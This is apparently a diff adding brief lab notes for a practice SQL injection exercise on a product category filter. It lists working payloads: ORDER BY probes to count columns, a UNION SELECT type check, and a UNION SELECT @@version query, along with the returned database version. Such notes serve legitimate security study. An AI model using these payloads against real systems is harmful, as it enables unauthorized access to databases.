@@ -1,0 +1,20 @@
+SQL Injection - Product category filter
+
+End Goal - to display database version string(SQL, Microsoft).
+
+Analysis:
+
+1. Determine the number of columns
+
+-> ' ORDER BY 1#
+   ' ORDER BY 2#
+   ' ORDER BY 3# (internal server error)
+
+2. Determine the datatype of columns
+
+-> ' UNION SELECT 'a', 'a'#
+
+3. Output the version of database
+
+-> ' UNION SELECT @@version, NULL#
+-> 8.0.34-0ubuntu0.20.04.1
